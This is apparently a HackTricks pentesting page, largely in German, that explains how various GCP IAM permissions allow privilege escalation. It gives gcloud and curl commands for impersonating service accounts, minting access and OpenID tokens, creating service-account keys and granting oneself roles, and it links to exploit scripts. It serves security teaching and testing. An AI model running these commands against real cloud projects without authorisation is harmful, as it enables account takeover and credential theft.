# GCP - IAM Privesc

{{#include ../../../banners/hacktricks-training.md}}

## IAM

Weitere Informationen zu IAM finden Sie in:

{{#ref}}
../gcp-services/gcp-iam-and-org-policies-enum.md
{{#endref}}

### `iam.roles.update` (`iam.roles.get`)

Ein attacker mit den genannten Berechtigungen kann eine Rolle, die Ihnen zugewiesen ist, aktualisieren und Ihnen zusätzliche Berechtigungen für andere Ressourcen wie:
```bash
gcloud iam roles update <rol name> --project <project> --add-permissions <permission>
```
Du findest ein Script, um die **Erstellung, exploit und Bereinigung einer vuln-Umgebung hier** zu automatisieren und ein python script, um dieses Privileg auszunutzen [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.roles.update.py). Für weitere Informationen siehe die [**original research**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).
```bash
gcloud iam roles update <Rol_NAME> --project <PROJECT_ID> --add-permissions <Permission>
```
### `iam.roles.create` & `iam.serviceAccounts.setIamPolicy`
Die iam.roles.create-Berechtigung erlaubt die Erstellung benutzerdefinierter Rollen in einem Projekt oder einer Organisation. In den Händen eines Angreifers ist das gefährlich, da es ihm ermöglicht, neue Berechtigungssätze zu definieren, die später Entitäten zugewiesen werden können (zum Beispiel mithilfe der iam.serviceAccounts.setIamPolicy-Berechtigung), mit dem Ziel der privilege escalation.
```bash
gcloud iam roles create <ROLE_ID> \
--project=<PROJECT_ID> \
--title="<Title>" \
--description="<Description>" \
--permissions="permission1,permission2,permission3"
```
### `iam.serviceAccounts.getAccessToken` (`iam.serviceAccounts.get`)

Ein Angreifer mit den genannten Berechtigungen kann **ein access token anfordern, das zu einem Service Account gehört**, daher ist es möglich, ein access token eines Service Account anzufordern, das mehr Berechtigungen hat als unseres.
```bash
gcloud --impersonate-service-account="${victim}@${PROJECT_ID}.iam.gserviceaccount.com" \
auth print-access-token
```
Du findest ein Skript, um die [**Erstellung, exploit und Bereinigung einer verwundbaren Umgebung hier**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/4-iam.serviceAccounts.getAccessToken.sh) zu automatisieren und ein Python-Skript, um dieses Privileg [**hier**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.getAccessToken.py) auszunutzen. Für weitere Informationen siehe die [**Originalforschung**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccountKeys.create`

Ein Angreifer mit den genannten Berechtigungen kann **einen vom Benutzer verwalteten Schlüssel für ein Service Account erstellen**, wodurch wir uns als dieses Service Account bei GCP anmelden können.
```bash
gcloud iam service-accounts keys create --iam-account <name> /tmp/key.json

gcloud auth activate-service-account --key-file=sa_cred.json
```
Du findest ein Script, um die [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/3-iam.serviceAccountKeys.create.sh) zu automatisieren, und ein Python-Script, um dieses Privileg auszunutzen, [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccountKeys.create.py). Für mehr Informationen siehe die [**original research**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

Beachte, dass **`iam.serviceAccountKeys.update` nicht funktioniert, um den Schlüssel eines SA zu ändern**, da dafür die Berechtigung `iam.serviceAccountKeys.create` ebenfalls benötigt wird.

### `iam.serviceAccounts.implicitDelegation`

Wenn du die Berechtigung **`iam.serviceAccounts.implicitDelegation`** auf einem Service Account hast, der die Berechtigung **`iam.serviceAccounts.getAccessToken`** auf einem dritten Service Account besitzt, kannst du implicitDelegation verwenden, um **einen Token für diesen dritten Service Account zu erstellen**. Hier ist ein Diagramm zur Veranschaulichung.

![](https://rhinosecuritylabs.com/wp-content/uploads/2020/04/image2-500x493.png)

Beachte, dass laut der [**documentation**](https://cloud.google.com/iam/docs/understanding-service-accounts) die Delegation von `gcloud` nur funktioniert, um einen Token mit der Methode [**generateAccessToken()**](https://cloud.google.com/iam/credentials/reference/rest/v1/projects.serviceAccounts/generateAccessToken) zu erzeugen. Hier siehst du, wie man einen Token direkt über die API erhält:
```bash
curl -X POST \
'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'"${TARGET_SERVICE_ACCOUNT}"':generateAccessToken' \
-H 'Content-Type: application/json' \
-H 'Authorization: Bearer '"$(gcloud auth print-access-token)" \
-d '{
"delegates": ["projects/-/serviceAccounts/'"${DELEGATED_SERVICE_ACCOUNT}"'"],
"scope": ["https://www.googleapis.com/auth/cloud-platform"]
}'
```
Du findest ein Skript, um die [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/5-iam.serviceAccounts.implicitDelegation.sh) zu automatisieren und ein python script, um dieses Privileg zu missbrauchen [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.implicitDelegation.py). Für mehr Informationen siehe die [**original research**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccounts.signBlob`

Ein Angreifer mit den genannten Berechtigungen kann **beliebige Payloads in GCP signieren**. Somit ist es möglich, **einen unsigned JWT des SA zu erstellen und ihn dann als Blob zu senden, damit der JWT vom SA signiert wird**. Für mehr Informationen [**read this**](https://medium.com/google-cloud/using-serviceaccountactor-iam-role-for-account-impersonation-on-google-cloud-platform-a9e7118480ed).

Du findest ein Skript, um die [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/6-iam.serviceAccounts.signBlob.sh) zu automatisieren und ein python script, um dieses Privileg zu missbrauchen [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-accessToken.py) und [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-gcsSignedUrl.py). Für mehr Informationen siehe die [**original research**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccounts.signJwt`

Ein Angreifer mit den genannten Berechtigungen kann **wohlgeformte JSON web tokens (JWTs) signieren**. Der Unterschied zur vorherigen Methode ist, dass **anstatt google ein Blob zu signieren, das ein JWT enthält, wir die signJWT-Methode verwenden, die bereits ein JWT erwartet**. Das macht die Nutzung einfacher, aber du kannst nur JWTs signieren anstatt beliebiger Bytes.

Du findest ein Skript, um die [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/7-iam.serviceAccounts.signJWT.sh) zu automatisieren und ein python script, um dieses Privileg zu missbrauchen [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signJWT.py). Für mehr Informationen siehe die [**original research**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccounts.setIamPolicy` <a href="#iam.serviceaccounts.setiampolicy" id="iam.serviceaccounts.setiampolicy"></a>

Ein Angreifer mit den genannten Berechtigungen kann **IAM policies zu service accounts hinzufügen**. Du kannst das ausnutzen, um dir **die Berechtigungen zu gewähren**, die du benötigst, um den service account zu impersonate. Im folgenden Beispiel gewähren wir uns die Rolle `roles/iam.serviceAccountTokenCreator` für den interessanten SA:
```bash
gcloud iam service-accounts add-iam-policy-binding "${VICTIM_SA}@${PROJECT_ID}.iam.gserviceaccount.com" \
--member="user:username@domain.com" \
--role="roles/iam.serviceAccountTokenCreator"

# If you still have prblem grant yourself also this permission
gcloud iam service-accounts add-iam-policy-binding "${VICTIM_SA}@${PROJECT_ID}.iam.gserviceaccount.com" \ \
--member="user:username@domain.com" \
--role="roles/iam.serviceAccountUser"
```
You can find a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/d-iam.serviceAccounts.setIamPolicy.sh)**.**

### `iam.serviceAccounts.actAs`

Die **iam.serviceAccounts.actAs permission** ist wie die **iam:PassRole permission from AWS**. Sie ist essenziell, um Aufgaben auszuführen — z. B. das Starten einer Compute Engine-Instanz — da sie die Fähigkeit gewährt, als "actAs" ein Service Account zu agieren und so ein sicheres permission-Management ermöglicht. Ohne diese könnten Benutzer unberechtigten Zugriff erlangen. Außerdem umfasst das Ausnutzen von **iam.serviceAccounts.actAs** verschiedene Methoden, die jeweils mehrere permissions erfordern, im Gegensatz zu anderen Methoden, die nur eine benötigen.

#### Service account impersonation <a href="#service-account-impersonation" id="service-account-impersonation"></a>

Impersonating a service account kann sehr nützlich sein, um **neue und bessere privileges** zu erhalten. Es gibt drei Wege, wie man [impersonate another service account](https://cloud.google.com/iam/docs/understanding-service-accounts#impersonating_a_service_account):

- Authentication **using RSA private keys** (oben behandelt)
- Authorization **using Cloud IAM policies** (hier behandelt)
- **Deploying jobs on GCP services** (mehr anwendbar auf die Kompromittierung eines Benutzerkontos)

### `iam.serviceAccounts.getOpenIdToken`

Ein Angreifer mit den genannten permissions kann ein OpenID JWT erzeugen. Diese werden benutzt, um Identität zu bestätigen, tragen jedoch nicht notwendigerweise eine implizite Autorisierung gegen eine Ressource.

Laut diesem [**interesting post**](https://medium.com/google-cloud/authenticating-using-google-openid-connect-tokens-e7675051213b) muss die audience angegeben werden (der Service, bei dem du das Token zur Authentifizierung verwenden möchtest) und du erhältst ein von google signiertes JWT, das das Service Account und die audience des JWT angibt.

You can generate an OpenIDToken (if you have the access) with:
```bash
# First activate the SA with iam.serviceAccounts.getOpenIdToken over the other SA
gcloud auth activate-service-account --key-file=/path/to/svc_account.json
# Then, generate token
gcloud auth print-identity-token "${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com" --audiences=https://example.com
```
Dann kannst du es einfach verwenden, um mit folgendem Befehl auf den Dienst zuzugreifen:
```bash
curl -v -H "Authorization: Bearer id_token" https://some-cloud-run-uc.a.run.app
```
Einige Dienste, die Authentifizierung über solche Token unterstützen, sind:

- [Google Cloud Run](https://cloud.google.com/run/)
- [Google Cloud Functions](https://cloud.google.com/functions/docs/)
- [Google Identity Aware Proxy](https://cloud.google.com/iap/docs/authentication-howto)
- [Google Cloud Endpoints](https://cloud.google.com/endpoints/docs/openapi/authenticating-users-google-id) (if using Google OIDC)

Ein Beispiel, wie man ein OpenID-Token im Namen eines Service-Accounts erstellt, finden Sie [**hier**](https://github.com/carlospolop-forks/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.getOpenIdToken.py).

## Referenzen

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
